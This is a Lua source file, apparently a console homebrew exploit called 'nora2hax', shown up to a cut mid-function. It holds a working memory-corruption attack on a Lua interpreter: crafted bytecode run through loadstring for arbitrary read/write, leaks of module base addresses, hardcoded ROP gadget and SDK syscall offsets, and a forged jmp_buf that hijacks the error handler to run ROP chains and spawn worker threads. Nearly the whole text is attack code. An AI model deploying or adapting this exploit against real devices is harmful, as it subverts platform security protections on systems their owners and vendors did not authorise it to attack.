-- the SDK bitches and aborts on an invalid mount name
package.path = "./?.lua;save:/lib/?.lua"

local function fatal(err)
	local okfmt, msg = pcall(tostring, err)
	if not okfmt then
		msg = "<unprintable error>"
	end
	pcall(print, "[!] fatal: " .. msg)
	return msg
end

local function addrof(o)
	local s = tostring(o)
	local i = s:find("0x")
	if not i then
		return nil
	end
	return tonumber(s:sub(i + 2), 16)
end
local function f2i(x)
	return x * 2 ^ -52 * 2 ^ -1022
end
local function i2f(x)
	return x * 2 ^ 52 * 2 ^ 1022
end

local offsets_main = {
	luaB_print = 0x129020,
	luaB_auxwrap = 0x129e80,
	-- luaD_rawrunprotected's setjmp return
	luaD_rawrunprotected_setjmp_va = 0x12fc7c,
	-- luaD_throw tail (longjmp(lj+8, 1))
	luaD_throw_tail_va = 0x12fb40,
	-- luaD_pcall continuation after rawrun
	luaD_pcall_resume_va = 0x130dec,
	malloc = 0x228fe0,
	free = 0x229040,
}

local offsets_sdk = {
	-- dynsym longjmp
	longjmp = 0x477ea4,
	-- ThreadManagerImplByHorizon::CreateThread
	-- x1=ThreadType*, x2=fn, w3=core; x0=(unused)
	thread_impl_create = 0x0b39b0,
	-- ThreadManagerImplByHorizon::StartThread
	-- x1=ThreadType* (reads [t+0x1b8])
	thread_impl_start = 0x0b3c10,
	-- ldp x3,x4,[sp,#0x10]; ldp x1,x2,[sp],#0x20; ret
	thread_impl_pop_x1_x4 = 0x477dac,
	-- svc #0x0a ; ret
	svc_exit_thread = 0x0d96cc,
	-- svc #0x0b ; ret
	svc_sleep_thread = 0x0d96d4,
	-- svc #0x27 ; ret
	svc_output_debug_string = 0x0d9814,
	-- svc #0x29 veneer: x0=&out, x1=type, x2=handle, x3=subid
	svc_get_info = 0x0d9824,
	-- svc #0x21 ; ret   (calling thread's TLS message buffer, 0x100 bytes)
	svc_send_sync = 0x0d97cc,
	-- svc #0x22 ; ret   (x0=buffer, x1=size, x2=handle; explicit RW page)
	-- offset is the SDK_SVC_STUBS row plus stub contiguity, not a decoded
	-- byte in this tree; the 12-worker Ryujinx run is the only proof so far
	svc_send_sync_user = 0x0d97d4,
	-- svc #0x18 ; ret   (x0=&out, x1=&handle, x2=n, x3=ns)
	svc_wait_sync = 0x0d9774,
	-- svc #0x16 ; ret   (x0=handle)
	svc_close_handle = 0x0d9764,
	-- svc #0x34 ; ret   (x0=addr, x1=ArbitrationType, x2=value,
	-- x3=timeout_ns; 0 is an immediate TimedOut, negative is infinite)
	svc_wait_for_address = 0x0d989c,
	-- svc #0x35 ; ret   (x0=addr, x1=SignalType, x2=value, x3=count;
	-- count <= 0 wakes every waiter)
	svc_signal_to_address = 0x0d98a4,
	-- WaitLightEvent's svcWaitForAddress block, entered at mov x3,#-1:
	-- x19=addr, WaitIfEqual on value 1, infinite timeout, returns through
	-- a 0x40-byte caller frame.  g_call3_void zeroes x3, so this is the
	-- only reachable infinite-timeout wait in the SDK.
	wait_for_address_eq1_inf = 0x0aa86c,
	-- mrs x0,tpidrro_el0 ; ret
	get_message_buffer_on_tls = 0x0bfea0,
	-- nn::fs::detail lazy singleton (.bss)
	fs_singleton = 0x0b16900,
	-- singleton +0x20: cached SharedPointer<IFileSystemProxy> payload
	fs_proxy = 0x020,
	-- singleton +0x3a8: session HandleAllocator free-list head
	fs_session_pool = 0x03a8,
	-- proxy +0x18: CMIF domain object id
	fs_proxy_domain_id = 0x018,
	-- ldr w0,[x0,#0x44]; ret (pure, no TLS)
	get_thread_priority = 0x0ad7f0,
	-- nn::err::ShowApplicationError
	show_application_error = 0x1a0f60,
	-- nn::socket::*
	socket_initialize = 0xc1c80,
	socket_socket = 0xc18e0,
	socket_bind = 0xc17d0,
	socket_listen = 0xc1860,
	socket_accept = 0xc17b0,
	socket_recv = 0xc1720,
	socket_send = 0xc1760,
	socket_close = 0xc1930,
	socket_fcntl = 0xc1980,
	socket_get_last_error = 0xc1b80,
	-- vcall8: ldp x0..x8,x19,x29,x30; br x16 (x16 is preset by the loop)
	vcall8_pop = 0xb808c,
	-- ldp x16,x17,[sp],#0x10; ret  (the x16 loader the prelude blrs)
	vcall8_load_x16 = 0x7008
}

-- since our arb r/w needs 24 bytes for w/r cycle the next 2 GOT offsets we write get trashed! choose carefully :)
-- to make things funnier the symbols are lazy bound
local got_anchors_sdk = {
	-- vi_Initialize = { got = 0x3ad300, va = 0x26c390 } -- trashes vi::OpenDefaultDisplay, vi::CreateLayer
	-- ^ it usefully leaks nnCompat base on Ounce :)
	acos = { got = 0x3ad9e8, va = 0x47f008 }, -- trashes atan2, atan
}

local gadgets = {
	-- ldr x0,[sp,#8]; ldp x29,x30,[sp,#0x10]; add sp,#0x20; ret
	g_load_x0 = 0x076780,
	-- ldp x29,x30,[sp,#0x10]; ldr x19,[sp,#8]; ldr d8,[sp],#0x20; ret
	g_load_x19 = 0x01eee8,
	-- ldr x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_peek_x0_x19 = 0x1463c8,
	-- str x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_store_x0_x19 = 0x066970,
	-- sub sp,x29,#0x50; ...; ret
	g_pivot = 0x14a94c,
	-- ldr x8,[x0,#8]; x0=[x19+0x50]; x3=0; x1,x2=[x19+0x20];
	-- x4=0; blr x8; ldp x29,x30,[sp,#0x10]; mov w0,#0;
	-- ldp x20,x19,[sp],#0x20; ret   (x0 result is zeroed)
	g_call3_void = 0x0b6970,
	-- ldp x8,x9,[sp]; ldp x29,x30,[sp,#0x20]; stp x8,x9,[x19];
	-- ldr x19,[sp,#0x10]; add sp,#0x30; ret
	g_load_x8_call5 = 0x22391c,
	-- ldr x2,[sp,#8]; ldp x29,x30,[sp,#0x10]; mov x1,x0;
	-- mov x0,x19; ldr x19,[sp],#0x20; br x2
	g_branch_x2 = 0x1c35d4,
	-- blr x8; ldp x29,x30,[sp,#0x10]; ldr x19,[sp],#0x20; ret
	g_blr_x8_keep_x0 = 0x002f20,
	-- add sp,sp,#0x200; ldp x29,x30,[sp,#0x30];
	-- ldp x20,x19,[sp,#0x20]; ldp x22,x21,[sp,#0x10];
	-- ldr x28,[sp],#0x40; ret   (worker entry)
	g_thread_pivot = 0x111dcc,
	-- sub sp,x29,#0x50; ...; ldp x29,x30,[sp,#0x50];
	-- ...; ldp x28,x27,[sp],#0x60; ret   (loop loader)
	g_pivot = 0x14a94c,
	-- ldr x8,[x19,#0x48]; ldr x1,[x19,#0x38]; ldr x0,[x19,#0x50];
	-- blr x8; str xzr,[x19,#0x38]; ldp x29,x30,[sp,#0x10];
	-- ldp x20,x19,[sp],#0x20; ret   (job call: x0/x1 only)
	g_call2 = 0x0b7a88,
	-- main PLT stub for longjmp (imported)
	plt_longjmp = 0x22a5b8,
	-- main .got.plt JUMP_SLOT for longjmp
	got_longjmp = 0x3ad8e0,
	-- main .text size (PLT-range check)
	lua_text_end = 0x22abe8,
	-- unresolved lazy JUMP_SLOT value
	plt0 = 0x229258
}

local offsets_lua = {
	errorjmp = 0x0a8, -- lua_State.errorJmp
	errfunc = 0x0b0, -- lua_State.errfunc (plain pcall = 0)
	lj_b = 0x008, -- lua_longjmp.b (jmp_buf)
	lj_status = 0x140, -- lua_longjmp.status
	jmpbuf_scan = 0x130, -- scan bound inside lua_longjmp
	raw_frame_x29 = 0x168, -- saved x29 in the rawrunprotected frame
	raw_frame_x30 = 0x170, -- saved x30 in the rawrunprotected frame
	lua_errrun = 2, -- LUA_ERRRUN
	lua_errerr = 5 -- LUA_ERRERR
}

-- memory map for our scratch pool
local layout = {
	rop_backup = 0x000,
	rop_forged = 0x200,
	rop_chain = 0x400,
	rop_chain_size = 0x300,
	rop_result = 0x700,
	rop_marker = 0x710,
	rop_scratch = 0x730,
	rop_ounce = 0x750,
	rw_probe = 0x770,
	rw_guard = 0x780,
	main_calls = 0xC00,
	main_calls_size = 0x400,
	thread_priority = 0x10, -- kernel priority = 0x10 + 0x1c
	thread_core = 0,
	thread_tt_size = 0x1C0, -- through the u32 handle at +0x1b8
	thread_tt_alloc = 0x200, -- zeroed through +0x1f8
	slack = 0x10,
	worker_count = 12,
	worker_stride = 0x3000,
	worker_block_size = 0x24000,
	worker_align = 0x1000,
	worker_tt_off = 0x000,
	worker_handle_off = 0x1B8,
	worker_prio_off = 0x44,
	worker_stack_size_off = 0x50,
	worker_stack_ptr_off = 0x58,
	worker_stack_off = 0x200,
	worker_stack_size = 0x800,
	worker_top_off = 0xA00,
	worker_pd_off = 0xBB0, -- TOP + 0x1B0
	worker_pd_x29_off = 0xBE0,
	worker_pd_x30_off = 0xBE8,
	worker_chain_off = 0xBF0, -- TOP + 0x1F0
	worker_chain_size = 0x410,
	worker_desc_off = 0x1000,
	worker_desc_blocks = 12,
	worker_desc_size = 0xC00, -- 12 blocks * 0x100
	worker_out_off = 0x1C00, -- kernel Result cell (svc #0x22)
	worker_wait_off = 0x1C08, -- svcWaitSynchronization &out
	worker_marker_off = 0x1C10,
	worker_string_off = 0x1C30,
	worker_scratch_off = 0x1C50,
	mailbox_cmd = 0x1C80,
	mailbox_ack = 0x1CA0,
	mailbox_status = 0x1CC0,
	mailbox_arg = 0x1CE0,
	job = 0x1D00,
	loop_scratch = 0x1D60,
	job_signal = 0x1D80,
	worker_ipc_off = 0x2000,
	worker_ipc_size = 0x1000
}

local AddressMap39Start = 0x08000000
local AddressMap39End = 0x7fffffffff

local MAILBOX_ARMED = 1
local MAILBOX_GO = 2

local function setup()
	collectgarbage("stop")

	print("[*] nora2hax by alula")
	print("[*] sending big thanks to: Gezine, kurumuz, zecoxao, DialingSpoon")

	print("[+] setting up initial primitives...")
	local HELPER_READ =
		"\27\76\117\97\81\0\1\4\8\4\8\0\13\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\114\101\97\100\0\0\0\0\0\0\0\0\0\0\1\0\4\5\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\156\128\128\0\158\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\48\0\0\0\0\0\0\0\0\0\2\0\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\4\0\0\0\30\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HELPER_WRITE =
		"\27\76\117\97\81\0\1\4\8\4\8\0\14\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\119\114\105\116\101\0\0\0\0\0\0\0\0\0\0\2\0\6\6\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\192\0\128\0\156\64\0\1\30\0\128\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\64\112\48\119\0\0\0\0\0\0\0\0\0\2\1\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\8\0\0\0\30\0\128\0\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HR = assert(loadstring(HELPER_READ))
	local HW = assert(loadstring(HELPER_WRITE))

	local function prim(target)
		local T = {}
		T[f2i(0x1111)] = true
		T[f2i(target)] = true
		return T
	end
	local function r64(target)
		local v = HR(prim(target))
		if type(v) == "number" then
			return i2f(v)
		end
		return nil, type(v)
	end
	local function w64(target, qword)
		HW(prim(target), f2i(qword))
	end
	local function code4(addr, ws)
		for i = 1, #ws do
			w64(addr + 4 * (i - 1), ws[i])
		end
	end

	local function destructive_read(a)
		w64(a + 0x8, 3) -- tt = LUA_TNUMBER
		return r64(a)
	end

	local function save_cf(a)
		return destructive_read(a + 0x20)
	end
	local function set_cf(a, f)
		w64(a + 0x20, f)
	end

	local scratch_str = string.rep("\0", 0x4000)
	_G._pinned_scratch = scratch_str

	local box = { 0, 0 }
	_G._pinned_box = box
	local box_addr = addrof(box)
	assert(box_addr, "addrof(box) failed")
	w64(box_addr + 0x20, 3) -- tag slot for the array-pointer read below
	local box_array = r64(box_addr + 0x18)
	assert(box_array and box_array ~= 0, "box has no array part")
	box[1] = scratch_str
	w64(box_array + 8, 3) -- slot 1 tt = LUA_TNUMBER;
	local scratch_ts = r64(box_array)
	box[1] = 0
	assert(scratch_ts and scratch_ts ~= 0, "scratch TString unreadable")
	local heap = scratch_ts + 0x18 -- TString data area

	local scratch = heap + 0x900
	w64(scratch, 0x12676721372137)
	local sv = r64(scratch)
	print("[+] testing arb rw")
	assert(sv == 0x12676721372137)

	-- leak main / sdk module bases
	print("[*] leaking module bases")

	local anchor_co = coroutine.wrap(function() return true end)
	local anchor_addr = addrof(anchor_co)
	assert(anchor_addr, "core: addrof(coroutine.wrap) failed")
	local anchor_f = save_cf(anchor_addr)
	anchor_co = nil -- the damaged upvalue must never be traversed
	assert(anchor_f and anchor_f ~= 0, "core: anchor closure read failed")
	local main_base = anchor_f - offsets_main.luaB_auxwrap
	assert(main_base % 0x1000 == 0, "failed to leak main module base")

	print(string.format("[+] main @ 0x%x", main_base))

	math.acos(0) -- lazy bound!!!
	local anchor_func = got_anchors_sdk.acos
	local sdk_got_addr = main_base + anchor_func.got
	local sdk_func = destructive_read(sdk_got_addr)
	-- print(string.format("[+] func 0x%x", sdk_func))
	local sdk_base = sdk_func - anchor_func.va
	assert(sdk_base % 0x1000 == 0, "failed to leak sdk module base")

	print(string.format("[+] sdk  @ 0x%x", sdk_base))

	local function run_rop(opts)
		opts = opts or {}
		local co = coroutine.create(function()
			local L = addrof(coroutine.running())
			local ctx = {
				L = L
			}

			local state
			local ok, err = pcall(function()
				-- errfunc is the tag word of errorJmp; a read needs it and
				-- the write is restored right after
				w64(L + offsets_lua.errfunc, 3)
				local live = r64(L + offsets_lua.errorjmp)
				w64(L + offsets_lua.errfunc, 0)

				ctx.live = live
				assert(live, "no live errorJmp")

				if opts.capture_jmpbuf then
					local slots = {}
					for off = offsets_lua.jmpbuf_scan, 0, -8 do
						local slot = live + offsets_lua.lj_b + off

						w64(slot + 8, 3)
						slots[off] = r64(slot)
						assert(slots[off] ~= nil, "jmp_buf read failed")
					end

					w64(L + offsets_lua.errfunc, 0)

					local pc_off, sp_off
					for off = offsets_lua.jmpbuf_scan, 0, -8 do
						if slots[off] == main_base + offsets_main.luaD_rawrunprotected_setjmp_va then
							pc_off = off
						end
						if slots[off] == live - 8 then
							sp_off = off
						end
					end

					assert(pc_off and sp_off, "unrecognised jmp_buf layout")

					ctx.slots, ctx.pc_off, ctx.sp_off = slots, pc_off, sp_off
				end

				state = opts.build(ctx)

				opts.fire(ctx, state)
			end)

			if opts.before then
				opts.before(ctx, ok, err, state)
			end

			-- print(string.format("[D] pcall=%s err=%s", tostring(ok), tostring(err)))

			if opts.after then
				opts.after(ctx, ok, err, state)
			end
		end)

		local rok, rerr = coroutine.resume(co)
		-- if rok then
		-- 	print(string.format("[D] coroutine returned (%s)", coroutine.status(co)))
		-- else
		-- 	print(string.format("[D] coroutine failed: %s", tostring(rerr)))
		-- end

		return rok, rerr
	end

	local function new_emitter(chain_base, desc_base, desc_end, chain_end, scratch)
		local E = {
			cursor = chain_base,
			desc = desc_base,
			desc_end = desc_end,
			chain_end = chain_end,
			scratch = scratch or (heap + layout.rop_scratch),
			pending = nil
		}
		local function code(va)
			return main_base + va
		end
		function E:patch(va)
			if self.pending then
				w64(self.pending, va)
			end
		end
		function E:g0(v)
			self:patch(code(gadgets.g_load_x0))
			local b = self.cursor
			w64(b + 8, v or 0);
			w64(b + 0x10, 0)
			self.cursor = b + 0x20
			self.pending = b + 0x18
		end
		function E:g1(v)
			self:patch(code(gadgets.g_load_x19))
			local b = self.cursor
			w64(b + 8, v or 0);
			w64(b + 0x10, 0)
			self.cursor = b + 0x20
			self.pending = b + 0x18
		end
		function E:g2(v20, v19)
			self:patch(code(gadgets.g_store_x0_x19))
			local b = self.cursor
			w64(b, v20 or 0);
			w64(b + 8, v19 or 0);
			w64(b + 0x10, 0)
			self.cursor = b + 0x20
			self.pending = b + 0x18
		end
		function E:peek(addr, cell)
			self:g1(addr)
			self:patch(code(gadgets.g_peek_x0_x19))
			local b = self.cursor
			w64(b, 0) -- x20
			w64(b + 8, cell or (heap + layout.rop_result)) -- x19 = result cell
			w64(b + 0x10, 0) -- x29
			self.cursor = b + 0x20
			self.pending = b + 0x18 -- x30, patched by the next emission
			self:g1(cell or (heap + layout.rop_result))
			self:g2(0, 0) -- str x0,[result cell]
		end
		-- svcWaitForAddress(addr, WaitIfEqual, 1, -1)
		function E:wait_eq1(addr, x29v)
			self:g1(addr)
			self:patch(sdk_base + offsets_sdk.wait_for_address_eq1_inf)
			local b = self.cursor
			w64(b, 0) -- the site's Result store
			w64(b + 8, 0)
			w64(b + 0x10, 0) -- x22
			w64(b + 0x18, 0) -- x21
			w64(b + 0x20, 0) -- x20
			w64(b + 0x28, 0) -- x19
			w64(b + 0x30, 0) -- x29
			self.cursor = b + 0x40
			self.pending = b + 0x38 -- x30, patched by the next emission
		end
		function E:vcall2(desc)
			self:g1(desc)
			self:patch(code(gadgets.g_call2))
			local b = self.cursor
			w64(b, 0) -- x20
			w64(b + 8, desc) -- x19
			w64(b + 0x10, 0) -- x29
			self.cursor = b + 0x20
			self.pending = b + 0x18 -- x30, patched by the next emission
		end
		function E:loop(chain)
			self:patch(code(gadgets.g_load_x0))
			local b = self.cursor
			w64(b, 0)
			w64(b + 8, 0) -- x0
			w64(b + 0x10, chain + 0x50) -- x29
			w64(b + 0x18, main_base + gadgets.g_pivot) -- x30
			self.cursor = b + 0x20
			self.pending = nil
		end
		function E:flush() end
		function E:job_header(chain, arg)
			for off = 0, 0x60 - 8, 8 do
				w64(chain + off, 0)
			end
			w64(chain + 0x48, arg) -- g_pivot's x19
			w64(chain + 0x50, 0) -- g_pivot's x29
			w64(chain + 0x58, main_base + gadgets.g_load_x8_call5)
		end
		function E:job_prelude(arg)
			local P = self.cursor
			w64(P + 0x00, sdk_base + offsets_sdk.vcall8_load_x16) -- x8
			w64(P + 0x08, 0) -- x9
			w64(P + 0x10, arg) -- x19 after the store
			w64(P + 0x20, 0) -- x29
			w64(P + 0x28, main_base + gadgets.g_blr_x8_keep_x0) -- x30
			w64(P + 0x30, main_base + gadgets.g_call2) -- x16, loaded by the callee
			w64(P + 0x38, 0) -- x17
			w64(P + 0x40, 0) -- x19 after g_blr
			w64(P + 0x50, 0) -- x29 after g_blr
			w64(P + 0x58, main_base + gadgets.g_load_x19) -- ret -> the wait frame
			self.cursor = P + 0x60
			self.pending = nil
		end
		function E:job_call(job)
			self:patch(sdk_base + offsets_sdk.vcall8_pop)
			local V = self.cursor
			for off = 0, 0x38, 8 do
				w64(V + off, 0) -- x0..x7, rewritten by the caller
			end
			w64(V + 0x40, 0) -- x8
			w64(V + 0x48, job) -- x19 for g_call2
			w64(V + 0x50, 0) -- x29
			w64(V + 0x58, 0) -- x30 popped (br x16 does not use it)
			w64(V + 0x60, 0) -- g_call2's epilogue x20
			w64(V + 0x68, 0) -- g_call2's epilogue x19
			w64(V + 0x70, 0) -- g_call2's epilogue x29
			w64(V + 0x78, 0) -- g_call2's epilogue x30: patched by the next op
			self.cursor = V + 0x80
			self.pending = V + 0x78
			return V
		end
		function E:call3(target, x0v, x1v, x2v)
			self:patch(code(gadgets.g_load_x0))
			local t = self.desc
			local a = t + 0x40
			if t + 0x100 > self.desc_end then
				error("rop descriptor pool overflow", 0)
			end
			self.desc = t + 0x100
			w64(t + 8, target)
			w64(a + 0x20, x1v or 0)
			w64(a + 0x28, x2v or 0)
			w64(a + 0x50, x0v or 0)
			local b0 = self.cursor
			w64(b0 + 8, t);
			w64(b0 + 0x10, 0);
			w64(b0 + 0x18, code(gadgets.g_load_x19))
			self.cursor = b0 + 0x20
			local b1 = self.cursor
			w64(b1 + 8, a);
			w64(b1 + 0x10, 0);
			w64(b1 + 0x18, code(gadgets.g_call3_void))
			self.cursor = b1 + 0x20
			local b2 = self.cursor
			w64(b2, 0);
			w64(b2 + 8, 0);
			w64(b2 + 0x10, 0)
			self.cursor = b2 + 0x20
			self.pending = b2 + 0x18
		end
		function E:call5(target, a0, a1, a2, a3, a4, result_cell)
			self:patch(code(gadgets.g_load_x19))
			local b0 = self.cursor
			w64(b0 + 8, self.scratch);
			w64(b0 + 0x10, 0)
			w64(b0 + 0x18, code(gadgets.g_load_x8_call5))
			self.cursor = b0 + 0x20
			local b1 = self.cursor
			w64(b1, target)
			w64(b1 + 8, 0)
			w64(b1 + 0x10, a0 or 0) -- new x19 = a0
			w64(b1 + 0x18, 0)
			w64(b1 + 0x20, 0) -- x29
			w64(b1 + 0x28, code(gadgets.g_branch_x2))
			self.cursor = b1 + 0x30
			local b2 = self.cursor
			w64(b2, 0) -- new x19 (unused by pop x1..x4)
			w64(b2 + 8, sdk_base + offsets_sdk.thread_impl_pop_x1_x4)
			w64(b2 + 0x10, 0)
			w64(b2 + 0x18, code(gadgets.g_blr_x8_keep_x0))
			self.cursor = b2 + 0x20
			local b3 = self.cursor
			w64(b3, a1 or 0);
			w64(b3 + 8, a2 or 0)
			w64(b3 + 0x10, a3 or 0);
			w64(b3 + 0x18, a4 or 0)
			self.cursor = b3 + 0x20
			local b4 = self.cursor
			w64(b4, result_cell or (heap + layout.rop_result)) -- x19 = result cell
			w64(b4 + 8, 0);
			w64(b4 + 0x10, 0)
			w64(b4 + 0x18, code(gadgets.g_store_x0_x19))
			self.cursor = b4 + 0x20
			local b5 = self.cursor
			w64(b5, 0);
			w64(b5 + 8, 0);
			w64(b5 + 0x10, 0)
			self.cursor = b5 + 0x20
			self.pending = b5 + 0x18
		end
		return E
	end

	local rop_backup = heap + layout.rop_backup
	local rop_forged = heap + layout.rop_forged
	local rop_chain = heap + layout.rop_chain
	local longjmp_b = offsets_lua.lj_b

	local function chain_builder(emit, chain_base, chain_end)
		chain_base = chain_base or rop_chain
		chain_end = chain_end or (heap + layout.rop_result - layout.slack)
		return function(ctx)
			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_backup + off, ctx.slots[off])
			end

			local E = new_emitter(chain_base, heap + layout.main_calls,
				heap + layout.main_calls + layout.main_calls_size,
				chain_end, heap + layout.rop_scratch)

			local b = E.cursor
			w64(b + 8, 0); w64(b + 0x10, 0)
			E.cursor = b + 0x20
			E.pending = b + 0x18
			emit(E)
			E:call3(sdk_base + offsets_sdk.longjmp, rop_backup, offsets_lua.lua_errrun, 0)

			if E.cursor > E.chain_end then
				error("rop chain overlaps the result cell", 0)
			end

			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_forged + longjmp_b + off, ctx.slots[off])
			end
			
			w64(rop_forged + longjmp_b + ctx.pc_off, main_base + gadgets.g_load_x19)
			w64(rop_forged + longjmp_b + ctx.sp_off, chain_base)
			w64(ctx.live + offsets_lua.lj_status, offsets_lua.lua_errrun)
		end
	end

	local function fire8(ctx)
		w64(ctx.L + offsets_lua.errorjmp, rop_forged)
		w64(ctx.L + offsets_lua.errfunc, 0)
		error("meow", 0)
	end

	local function run_chain(emit, chain_base, chain_end)
		local rok, rerr = run_rop{
			build = function(ctx)
				return chain_builder(emit, chain_base, chain_end)(ctx)
			end,
			fire = fire8,
			capture_jmpbuf = true
		}
		if not rok then
			print("[!] chain coroutine failed: " .. tostring(rerr))
		end
	end

	local function call5(target, a0, a1, a2, a3, a4, result_cell, chain_base, chain_end)
		local RES = result_cell or (heap + layout.rop_result)
		run_rop{
			build = function(ctx)
				return chain_builder(function(E)
					E:call5(target, a0, a1, a2, a3, a4, RES)
				end, chain_base, chain_end)(ctx)
			end,
			fire = fire8,
			capture_jmpbuf = true
		}
		w64(RES + 8, 3)
		return r64(RES)
	end

	local function check_ounce()
		local OUT = heap + layout.rop_ounce
		w64(OUT, 0)
		local res = call5(sdk_base + offsets_sdk.svc_get_info,
			OUT, 32, 0xFFFF8001, 0, 0)
		return res == 0
	end

	local is_ounce = check_ounce()
	print("[*] running on:", is_ounce and "Ounce" or "NX")

	local RES = heap + layout.rop_result
	local node_probe = {}
	local node_probe_addr = addrof(node_probe)
	assert(node_probe_addr, "core: addrof(node probe) failed")
	run_chain(function(E)
		E:peek(node_probe_addr + 0x20, RES)
	end)
	w64(RES + 8, 3)
	local dummynode = r64(RES)
	assert(dummynode and dummynode ~= 0 and dummynode % 8 == 0,
		"core: could not read dummynode")
	w64(box_addr + 0x20, dummynode) -- node; the tag spills into lastfree
	w64(box_addr + 0x28, dummynode) -- lastfree; the tag spills into gclist

	-- TString* of a live string with no header writes at all: park it in the
	-- box's array slot 1 and read the raw eight bytes with the ROP peek.
	local function str_addr(s)
		assert(type(s) == "string", "core: str_addr wants a string")
		box[1] = s
		run_chain(function(E)
			E:peek(box_array, RES)
		end)
		w64(RES + 8, 3)
		local ts = r64(RES)
		box[1] = 0
		assert(ts and ts ~= 0, "core: str_addr read failed")
		return ts
	end

	local function tpidrro_el0()
		return call5(sdk_base + offsets_sdk.get_message_buffer_on_tls, 0, 0, 0, 0, 0)
	end

	local tls_addr = tpidrro_el0()
	print(string.format("[+] TPIDRRO_EL0=0x%x", tls_addr))

	local function wstr(addr, s)
		for i = 1, #s, 4 do
			local v = 0
			for j = 3, 0, -1 do
				v = v * 256 + (s:byte(i + j) or 0)
			end
			w64(addr + i - 1, v)
		end
	end

	local function alloc(size)
		return call5(main_base + offsets_main.malloc, size, 0, 0, 0, 0,
			heap + layout.rop_result)
	end

	local function free_block(ptr)
		run_chain(function(E)
			E:call3(main_base + offsets_main.free, ptr, 0, 0)
		end)
	end

	-- Deep SDK calls need a real stack: run_chain's default chain area is
	-- only a few hundred bytes.  Build the chain at the top of a 128 KiB
	-- block and let the callee grow down into the rest of it.
	local deep_stack
	local function call_deep(target, a0, a1, a2, a3, a4)
		if not deep_stack then
			deep_stack = alloc(0x20000)
			assert(deep_stack and deep_stack ~= 0,
				"core: deep stack allocation failed")
		end
		local base = deep_stack + 0x1E000
		-- run_rop rewrites lua_State.errorJmp; the collector must not run
		-- between that rewrite and the longjmp back.
		local r = call5(target, a0, a1, a2, a3, a4,
			heap + layout.rop_result, base, deep_stack + 0x20000)
		return r
	end

	local raw_block = alloc(layout.worker_block_size + 0x1000 - 1)
	if not raw_block or raw_block == 0 then
		error("worker block allocation failed", 0)
	end
	local block = raw_block + 0xfff
	block = block - block % 0x1000
	print(string.format("[+] worker block @ 0x%x", block))

	local function worker(i, off)
		return block + i * layout.worker_stride + off
	end

	local function build_worker_loop(i, area)
		local chain = area.chain
		for off = 0, 0x60 - 8, 8 do
			w64(chain + off, 0)
		end
		w64(chain + 0x50, 0) -- g_pivot's x29
		w64(chain + 0x58, main_base + gadgets.g_load_x19) -- g_pivot's x30
		local E = new_emitter(chain + 0x60, area.desc, area.desc_end,
			area.chain_end, heap + layout.rop_scratch)
		E:wait_eq1(worker(i, layout.mailbox_cmd))
		E:vcall2(worker(i, layout.job))
		E:g1(worker(i, layout.worker_marker_off))
		E:g2(0, 0)
		E:peek(worker(i, layout.job) + 0x40, worker(i, layout.mailbox_status))
		E:g0(1)
		E:g1(worker(i, layout.mailbox_cmd))
		E:g2(0, 0)
		E:g0(0)
		E:g1(worker(i, layout.mailbox_ack))
		E:g2(0, 0)
		E:vcall2(worker(i, layout.job_signal))
		E:loop(chain)
		if E.cursor > E.chain_end then
			error("worker loop overlaps its end", 0)
		end
	end

	local function prepare(i, builder, w, L)
		w = w or worker
		L = L or layout
		local tt = w(i, L.worker_tt_off)

		for off = 0, L.thread_tt_alloc - 8, 8 do
			w64(tt + off, 0)
		end
		w64(tt + L.worker_prio_off, L.thread_priority)
		w64(tt + L.worker_stack_size_off, L.worker_stack_size)
		w64(tt + L.worker_stack_ptr_off, w(i, L.worker_stack_off))

		local pd = w(i, L.worker_pd_off)
		for off = 0, 0x40, 8 do
			w64(pd + off, 0)
		end
		w64(w(i, L.worker_pd_x29_off),
			w(i, L.worker_chain_off) + 0x50)
		w64(w(i, L.worker_pd_x30_off), main_base + gadgets.g_pivot)

		w64(w(i, L.worker_out_off), 0)
		w64(w(i, L.worker_wait_off), 0)
		w64(w(i, L.worker_marker_off), 0)
		w64(w(i, L.mailbox_cmd), MAILBOX_ARMED)
		w64(w(i, L.mailbox_ack), MAILBOX_ARMED)
		w64(w(i, L.mailbox_status), 0)
		w64(w(i, L.mailbox_arg), 0)
		w64(w(i, L.job) + 0x38, 0)
		w64(w(i, L.job) + 0x40, 0)
		w64(w(i, L.job) + 0x48, 0)
		w64(w(i, L.job) + 0x50, 0)
		w64(w(i, L.loop_scratch), 0)

		-- static ack signal descriptor: fn=svc #0x35, x0=ack, x1=0
		local sig = w(i, L.job_signal)
		w64(sig + 0x38, 0)
		w64(sig + 0x48, sdk_base + offsets_sdk.svc_signal_to_address)
		w64(sig + 0x50, w(i, L.mailbox_ack))

		local area = {
			chain = w(i, L.worker_chain_off),
			chain_end = w(i, L.worker_desc_off) - L.slack,
			desc = w(i, L.worker_desc_off),
